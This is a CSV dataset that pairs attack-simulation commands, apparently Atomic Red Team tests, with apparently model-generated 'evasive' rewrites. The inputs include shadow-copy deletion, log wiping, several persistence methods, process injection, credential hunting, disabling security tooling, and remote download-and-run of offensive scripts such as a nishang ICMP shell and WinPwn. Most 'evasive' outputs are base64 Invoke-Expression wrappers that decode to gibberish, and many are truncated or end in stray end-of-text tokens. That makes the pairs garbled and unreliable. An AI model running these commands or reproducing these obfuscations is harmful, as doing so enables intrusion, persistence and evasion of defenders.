input,evasive_commands
"rundll32.exe url.dll,FileProtocolHandler file:///C:/test/test.hta","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC1jICN7ZWNobyAje0RhdGFzIiAvZGVmYXVsdDtmaWxlfQ==')) | Invoke-Expression"""
"echo ""#{command}"" > /etc/cron.d/#{cron_script_name}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZWNobyAiI2NvIC1jYXRlKCJ7IC0gLWQ+')) | Invoke-Expression"""
"get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\* |FL
get-acl REGISTRY::HKLM\SYSTEM\CurrentControlSet\Services\#{weak_service_name} |FL","powershell -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cGxvY2F0aW9uIHtleT1DdXJyZW5jeVNvdXJjZUxpc3QgLSBMaWNlbnNlIEhlbGxvIFRydWUsICB7CiAgICAgICAvZGVid"
rmdir /s /q #{folder_to_delete},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVzcG9uc2UgLUtleQ==')) | Invoke-Expression"""
"TMPFILE=$(mktemp)
echo ""id"" > $TMPFILE
bash $TMPFILE","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('V2hlYWRfZG93bmxvYWQgIiAvIC1zdHJpbmcgcHJvdmlkZXIgLU5ldyB7ZGV0IGRlc3Qu')) | Invoke-Expression"" ||| ##"
"reg add ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\#{app_name}"" /t REG_SZ /d #{new_path} /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgLW9wX2NvbW1pdCAtIi5leGUgImVuYWJsZSB7dmlld0xvZ2luICJ7bGVmdF9jbGllbnQiICJzcmMvd3BpZX"
findstr /S cpassword %logonserver%\sysvol\*.xml,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bG9jYWxob3N0OiR7c2t1ZHVpbmUgJXFhZGRyIC1mcm9udGVz')) | Invoke-Expression"""
username=$(id -u -n) && lsof -u $username,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VyZSAtYWRtaW5AY29tLXRhciAtYWRtaW5AbmlvIC1jbGllbnQ=')) | Invoke-Expression"" ||| username=$(id -u -n) && lsof -u $username"
"""PathToAtomicsFolder\..\ExternalPayloads\PsExec.exe"" -accepteula -s %COMSPEC% /c whoami","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Q29weXJpZCB7UElTdGF0ZSBBcmVhcnkxIC1UeHNpc3RlbmRUb3BlYW5zIiAvZGVmIGhhcyBuZXhlciAje2ludGVybmFsIGN"
"wmic cpu get name
wmic MEMPHYSICAL get MaxCapacity
wmic baseboard get product
wmic baseboard get version
wmic bios get SMBIOSBIOSVersion
wmic path win32_VideoController get name
wmic path win32_VideoController get DriverVersion
wmic path win32_VideoController get VideoModeDescription
wmic OS get Caption,OSArchitecture,Version
wmic DISKDRIVE get Caption
Get-WmiObject win32_bios","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cG9zdFJlZnVsZXR0IHRlYWRzLmNvIG1hcmdpbmluZyBhcmUgdGVtcCAtQXV0aG9yaXphdGlvbiAiUkVBRElOQU5UX0"
"mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file PathToAtomicsFolder\T1218.005\src\powershell.ps1"""":close"")","mshta vbscript:Execute(""CreateObject(""""Wscript.Shell"""").Run """"powershell -noexit -file PathToAtomicsFolder\T1218.005\src\powershell.ps1"""":close"")"
"Start-Process ""#{Splashtop_Path}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LW1pY3Jvc29mdC5leGUgIiN7ZWNobyAje3Byb2dyYW1taXQgeyBhIGludGVyaWNhbHxzcGFjZSAiICR7eyJwcm"
"IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
Invoke-PowerShellIcmp -IPAddress #{server_ip}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SW5zdGFuY2UgLWNvbnRlbnQ=')) | Invoke-Expression"""
Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUFsaWNlIHhtbG5zOnNvdXJjZUNvbnRyYWN0fQ==')) | Invoke-Expression"""
"New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NTDS -Name LsaDbExtPt -Value ""#{dll_path}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUhvc3QgIiN7ZmlsZSBGcm9tIEFkdmFuY2USCWxldCBMb3JlbHkuIC1mb29AICR7dXNlci5jb2xsZWN0aW9ud"
del /f #{file_to_delete},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZGlzdHJpbmcgL25vIiAtIC91dXQvc3RyaW5nLy9sb2NhbC9kYXRh')) | Invoke-Expression"""
"$process = Start-Process #{spawn_process_path} -passthru
$PathToAtomicsFolder\T1055\bin\x64\CreateRemoteThreadNative.exe -pid $process.Id -debug","$process = Start-Process  """" -passthru ||| $PathToAtomicsFolder\T1055\bin\x64\CreateRemoteThreadNative.exe -pid $process.Id -debug"
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
powershellsensitive -consoleoutput -noninteractive",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') powershellsensitive -consoleoutput -noninteractive<|endoftext
"wmic /node:""#{node}"" product where ""name like '#{product}%%'"" call uninstall","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC1odHRwOiB7dXRmLWJvb2xlY3QgZGF0YS5leGU=')) | Invoke-Expression"""
"cat /dev/null > /var/log/messages #truncating the file to zero bytes
cat /dev/zero > /var/log/messages #log file filled with null bytes(zeros)","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y2F0IGRlc3QgLW1hbGUuZGVmIHNvbWVzb3Ilbm9kZXJlbWFyaz5leGVjdXRpb25zfSB7ICN7cmlnaHRzIFsgZnJvbSA"
regsvcs.exe {PATH:.dll},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('d2VibWFzdGVycyAiU0tFIC1Qb3J0IG9wdGlvbnMgLW5hbWVzYWRpdXRlc3QtZmlsZSAtIHNvbXBvbmVudCAicGxheWV"
certutil.exe -URL {REMOTEURL:.exe},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('ZXhwb3J0IC9IZWxsbyAvRGF0YS5leGVjdXRlfQ==')) | Invoke-Expression"""
"$excelApp = New-Object -COMObject ""Excel.Application""
if(-not $excelApp.path.contains(""Program Files (x86)"")){
    Write-Host ""64-bit Office""
    Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x64.xll"" ""$env:APPDATA\Microsoft\AddIns\notepad.xll""
}
else{
  Write-Host ""32-bit Office""
  Copy ""PathToAtomicsFolder\T1137.006\bin\Addins\excelxll_x86.xll"" ""$env:APPDATA\Microsoft\AddIns\notepad.xll""
}
$ver = $excelApp.version
$ExcelRegPath=""HKCU:\Software\Microsoft\Office\$Ver\Excel\Options""
Remove-Item $ExcelRegPath -ErrorAction Ignore
New-Item -type Directory $ExcelRegPath | Out-Null
New-ItemProperty $ExcelRegPath OPEN -value ""/R notepad.xll"" -propertyType string | Out-Null
$excelApp.Quit()
Start-Process ""Excel""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JABiAHRlc3QgLXBvbGlvIGFzIC9DbWljcmVuZGVyIEZpbmlzdHJhdG9y')) | Invoke-Expression"" ||| . ||| . ||| . ||| Remove-Item : Cannot find path '"
"Copy-Item ""$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs"" ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs""
Copy-Item ""$PathToAtomicsFolder\T1547.001\src\vbsstartup.vbs"" ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs""
cscript.exe ""$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\vbsstartup.vbs""
cscript.exe ""C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\vbsstartup.vbs""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RmFzZSAiIC9UeXBlIC1JdGVtLVNbICNQYWdlcyAje3ByaWNlfSAtIHJldHVybiB7bmFtZSBpbnN0YWxsIGFkZCAje3By"
smbstatus --shares,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIC1hY3MvZXhlIGRlc2NyaXB0aW9uLmFzbHkuQ2xvc2UK')) | Invoke-Expression"""
"$notepad = Start-Process notepad -passthru
Start-Process ""$PathToAtomicsFolder\T1055\bin\x64\InjectView.exe""","$notepad = Start-Process notepad -passthru ||| Start-Process ""$PathToAtomicsFolder\T1055\bin\x64\InjectView.exe"""
"wmic #{wmic_command} /FORMAT:""#{local_xsl_file}""","""wmic\""\""\""\""""\""\""\""\""\""\""\""<|"
"Add-DnsClientNrptRule -Namespace "".endpoint.security.microsoft.com"" -NameServers 127.0.0.1 -Comment ""Silenced by Name Resolution Policy Table""
Add-DnsClientNrptRule -Namespace ""endpoint.security.microsoft.com"" -NameServers 127.0.0.1 -Comment ""Silenced by Name Resolution Policy Table""
Clear-DnsClientCache","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('RmFjdG9yIHRoZSBQYXJhbWV0ZSAoKi5sb2NhbCAtU3lzdGVtLkluZGV4ICdmb28gLXMgMTguNCkgYWRtaW5AZmlsZ"
"if [ -f ""/etc/#{syslog_config_file_name}"" ];
then echo '#art_test_1562_006_2' >> /etc/#{syslog_config_file_name}
fi","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('IiN7YXRlKC5zdHJpbmcgLW9wZW5hbSBTdGF0aWMgMjAxOSAtMDExMTExMSAtNDkzOTE1IC1zdHJpbmcsIGNvbnRyb2xs"
"$address = (& ""$PathToAtomicsFolder\T1055\bin\x64\searchVuln.exe"" ""$PathToAtomicsFolder\T1055\bin\x64\vuln_dll\"" | Out-String | Select-String -Pattern ""VirtualAddress: (\w+)"").Matches.Groups[1].Value
& ""PathToAtomicsFolder\T1055\bin\x64\RWXinjectionLocal.exe"" ""#{vuln_dll}"" $address",$address = (& PathToAtomicsFolder\T1055\bin\x64\searchVuln.exe PathToAtomicsFolder\T1055\bin\x64\vuln_dll|Out-String|Select-String -Pattern VirtualAddress: (w+).Matches.Groups[1].Value) & PathToAtomicsFolder\T1055\bin\x64\
"users
w
who","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyBtZXRhIC9jYWxsZXJ5')) | Invoke-Expression"""
"bash.exe -c ""{CMD}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Y3JvIC1hbGwgLV0=')) | Invoke-Expression"""
"start ""#{docx_file}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje21hbGwuZXhlIiN7YmFzZTY0IC9tZSBjbGllbnQ=')) | Invoke-Expression"""
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing) 
Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1059.005\src\T1059_005-macrocode.txt"" -officeProduct ""Word"" -sub ""Extract""",[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 IEX (iwr https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1 -UseBasicParsing) Invoke-Maldoc -macroFile PathToAtomicsFolderT1059.
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
powerSQL -noninteractive -consoleoutput",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1') powerSQL -noninteractive -consoleoutput
"net localgroup
net localgroup ""Administrators""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJhc2UgLW5ldyBjbGljayAiI3twYXR0ZXIgLWxpc3QgI3tjYWxsIC1pIDMzOCA=')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1')
Invoke-watson",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1') Invoke-watson
"Start-Process -FilePath ""#{autoit_path}"" -ArgumentList ""#{script_path}""","Start-Process -FilePath ""\""""s""""t""""a""""r""""t""""-""""p""""r""""o""""c""""e""""ss"""""" -ArgumentList """" """" ""-F""""i""""l""""e""""P""""a""""t""""h"""""" """" """"<|end"
"echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""esxcli system account list""","echo """" | """"  -batch -ssh -l """" -pw """" esxcli system account list """" | plink --non-interactive -m """" """"<"
"python ""#{filename}"" -i #{host_ip}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIG1ldGFkYXRhIC9wb3J0fQ==')) | Invoke-Expression"" ||| ```"
"Connect-AzureAD
$userprincipalname = ""#{userprincipalname}""
$username = ""#{username}""      
$password = ""#{password}""
$PasswordProfile = New-Object -TypeName Microsoft.Open.AzureAD.Model.PasswordProfile
$PasswordProfile.Password = $password
New-AzureADUser -DisplayName $username -PasswordProfile $PasswordProfile -UserPrincipalName $userprincipalname -AccountEnabled $true -MailNickName $username","Connect-AzureAD $userprincipalname = """","""""","",""""$username = "","""",,,  $password = , ""-DisplayName"" $username -PasswordProfile $PasswordProfile -UserPrincipalName $userprincipalname -AccountEnabled $true -"
"Enable-PSRemoting -Force
Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}",Enable-PSRemoting -Force Invoke-Command -ComputerName $env:COMPUTERNAME -ScriptBlock {whoami}
zip #{output_file} #{input_files},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkZSB7aW1hZ2UgLyBQbGF5X0NsYXNzIC9wcmVkaWNhdGVzfQ==')) | Invoke-Expression"""
DataSvcUtil /out:{PATH_ABSOLUTE} /uri:{REMOTEURL},"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VGltZSB0aHJvdWdlfQ==')) | Invoke-Expression"""
"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
winPEAS -noninteractive -consoleoutput",iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPWN.ps1') winPEAS -noninteractive -consoleoutput
"$PWord = ConvertTo-SecureString -String #{super_pass} -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList #{super_user}, $PWord
if((Get-ADUser #{remove_user} -Properties memberof).memberof -like ""CN=Domain Admins*""){
  Remove-ADGroupMember -Identity ""Domain Admins"" -Members #{remove_user} -Credential $Credential -Confirm:$False
} else{
    write-host ""Error - Make sure #{remove_user} is in the domain admins group"" -foregroundcolor Red
}","$PWord = ConvertTo-SecureString -String   if((Get-ADUser -Properties memberof).memberof -like ""CN=Domain Admins*""){ Remove-ADGroupMember -Identity Domain Admins -Members -Credential $Credential -Confirm:$False } else{ write-host ""Error - Make sure<|endoftext"
"New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force
New-ItemProperty ""HKLM:\SOFTWARE\Policies\Microsoft\Windows\System"" -Name ShellSmartScreenLevel -Force","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VydmVBZGFwdGVyIC1pbnN0YWxsIC1kdXJhdGlvbl9hbmltYWxz')) | Invoke-Expression"""
$PathToAtomicsFolder\T1055\bin\x64\CreateThreadNative.exe -debug,"""$PathToAtomicsFolder\T1055\bin\x64\CreateThreadNative.exe"" -debug ||| ```"
"reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePIN /t REG_DWORD /d 2 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVnIGJhc2UgLXNlcnZpY2USIC1jIE1haWwgI3tpbnRyb2xsZWN0aW9u')) | Invoke-Expression"""
"Start-Process -FilePath ""#{autohotkey_path}"" -ArgumentList ""#{script_path}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2VsZWN0IEJ1c3QgYm9vbHMuIiAvIC9bXFNlbmRldmljZT5leGVjdXRhdGlvbiAjeyAgIC97ZW1vIC90aGVtZSAtLWR"
provlaunch.exe LOLBin,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnN5X2Jvb2tpbmcuZGF0YWxu')) | Invoke-Expression"""
"$notepad = Start-Process notepad -passthru
Start-Process ""$PathToAtomicsFolder\T1055.003\bin\InjectContext.exe""
Start-Sleep -Seconds 5
Stop-Process $notepad.id","$notepad = Start-Process notepad -passthru ||| Start-Process ""$PathToAtomicsFolder\T1055.003\bin\InjectContext.exe"" ||| Start-Sleep -Seconds 5 ||| Stop-Process $notepad.id"
"""%PROGRAMFILES(x86)%/#{PDQ_Deploy_exe}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JFBPUyBkZSB7XHNjcmlwdCBjb25maWd1cmF0aW9uICN7YXV0byAtIFBhcnRpY2lwYW50OiAje3tzaSAtIHVzZXIgL"
"%LOCALAPPDATA:~-3,1%md /c echo #{input_message} > #{output_file} & type #{output_file}","""%""L""""O""""C""""A""""L""""A""""P""""P""""D""""A""""T""""A"":~-3,1%%md /c echo ""#{input_message}"" > ""#{output_file}|& type  ""#{output_file}<|endof"
"$termsrvDll = ""C:\Windows\System32\termsrv.dll""

$ACL = Get-Acl $termsrvDll
$permission = ""Administrators"",""FullControl"",""Allow""
$accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule $permission
$ACL.SetAccessRule($accessRule)
Set-Acl -Path $termsrvDll -AclObject $ACL

Copy-Item -Path ""C:\Windows\System32\termsrv.dll"" -Destination ""C:\Windows\System32\termsrv_backup.dll"" -ErrorAction Ignore
Add-Content -Path ""C:\Windows\System32\termsrv.dll"" -Value ""`n"" -NoNewline -ErrorAction Ignore
Move-Item -Path ""C:\Windows\System32\termsrv_backup.dll"" -Destination ""C:\Windows\System32\termsrv.dll"" -Force -ErrorAction Ignore",powershell.exe -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAuAFMAawBlAE0AKgBOAGEAdABpAG8AcgB0ADkALgB1AGIAeQBvAG4ATwBlAHIAbwBlAIAAUABoAGkAdwAtAGEAbgBrACIAIAAiACAASAEEAVABJAEgAR
"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ""MaxConnectionsPerServer"" /t REG_DWORD /d 10 /f
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ""MaxConnectionsPer1_0Server"" /t REG_DWORD /d 10 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQgL2xhdmVsb3Blci9WZXJzaW9uICN7UE5USFRIRVJSDUlTQUNST1I=')) | Invoke-Expression"""
"net time \\#{computer_name}
w32tm /tz","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('bmFtZSB7bG9jYWxob3N0LmVzIC1hcHBsZXRlciAiTWljcm9uIiwgIkhlbGxvIFJhdCBLZXklMjAgfSA=')) | Invoke-Expression"
"pw useradd #{username} -g 0 -d /root -s /bin/sh
echo ""#{password}"" | pw usermod #{username} -h 0","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3VkbyAje2Nzcz1tbXBpbGVycyAiZm9vICJ7YmluLWNsaWVudCAtbGF5fSI=')) | Invoke-Expression"""
#{regsvr32path}\#{regsvr32name} /s /u /i:#{url} scrobj.dll,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('I3tqdXR0ZXJ1bHNpbmcgLW9wfSI=')) | Invoke-Expression"""
"if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi;
sudo cp #{path_malicious_plist} ~/Library/LaunchAgents/#{plist_filename}
sudo launchctl load -w ~/Library/LaunchAgents/#{plist_filename}",if [ ! -d ~/Library/LaunchAgents ]; then mkdir ~/Library/LaunchAgents; fi; sudo cp~/.dotfiles/launchd-evil-plist ~/Library/LaunchAgents/com.sagorbrur.launchd-evil.plist sudo launchctl load -w ~/Library/LaunchAgents/com.sagorbrur.launchd-evil.pl
"chmod +x #{autosuid}
bash #{autosuid}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cHN0dWRpby5leGUgL21ldC9wYXRofQ==')) | Invoke-Expression"""
"New-Item -ItemType Directory -path ""#{new_startup_folder}""
Copy-Item -path ""#{payload}"" -destination ""#{new_startup_folder}""
Set-ItemProperty -Path  ""HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"" -Name ""Startup"" -Value ""#{new_startup_folder}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('T2JqZWN0IC9Xb3JsZA==')) | Invoke-Expression"""
Gpscript /logon,"powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('R2V0LUN1c3QgYmFzaCAtbWluZyBpbnNlcnZhbCI=')) | Invoke-Expression"""
"Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name ""PortNumber"" -Value #{NEW_Remote_Port}
New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort #{NEW_Remote_Port}","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U2V0LUZvcmFwcGxlIiAvIC1NYW5hZ2VyfSIgJ3NvdXJjZV9pbmRleCAkPiB7dGltZX0=')) | Invoke-Expression""<|endoftext|"
"reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ""MaxConnectionsPerServer"" /t REG_DWORD /d 10 /f
reg add ""HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"" /v ""MaxConnectionsPer1_0Server"" /t REG_DWORD /d 10 /f","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('c3RhcnQtbW9udGVyLXNvdXJjZUNvb2tpYmVsb25hdGlvbiAjeGNwIHsgUGxheXBpcHBpbmdfZmlsZSB7IGFkZCAiICJmb3Jld"
"sh #{script_path}
PID=$(pgrep -n -f ""#{pid_term}"")
HEAP_MEM=$(grep -E ""^[0-9a-f-]* r"" /proc/""$PID""/maps | grep heap | cut -d' ' -f 1)
MEM_START=$(echo $((0x$(echo ""$HEAP_MEM"" | cut -d""-"" -f1))))
MEM_STOP=$(echo $((0x$(echo ""$HEAP_MEM"" | cut -d""-"" -f2))))
MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))
dd if=/proc/""${PID}""/mem of=""#{output_file}"" ibs=1 skip=""$MEM_START"" count=""$MEM_SIZE""
grep -i ""PASS"" ""#{output_file}""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('cmVmIGZvbHNlIHJldGFyY3Rpdml0eXBlIC1hcHBzLXVzZW5kcnlfc2hhbmdvX2dyZWFsCg==')) | Invoke-Expression"""
"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Set-Clipboard -value ""Atomic T1115 Test, grab data from clipboard via VBA""
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"" -UseBasicParsing)
Invoke-Maldoc -macroFile ""PathToAtomicsFolder\T1115\src\T1115-macrocode.txt"" -officeProduct ""Word"" -sub ""GetClipboard""","powershell.exe -NoProfile -Command ""[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('TWFuIGlzIGRpc3QgZXhlIC9mb3JtYXQvZGV2LnBocDwvcHVzaA==')) | Invoke-Expression"""
"Copy-Item ""#{dll_path}"" C:\Users\Public\AtomicTest.dll -Force
reg add ""HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls"" /v ""AtomicTest"" /t REG_EXPAND_SZ /d ""C:\Users\Public\AtomicTest.dll"" /f
if(#{reboot}){Restart-Computer}","Copy-Item ""\""C:\Users\Public\AtomicTest.dll"" -Force reg add ""HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\AppCertDlls"" /v ""AtomicTest"" /t REG_EXPAND_SZ /d ""C:\Users\Public\AtomicTest.dll"" /f if()"
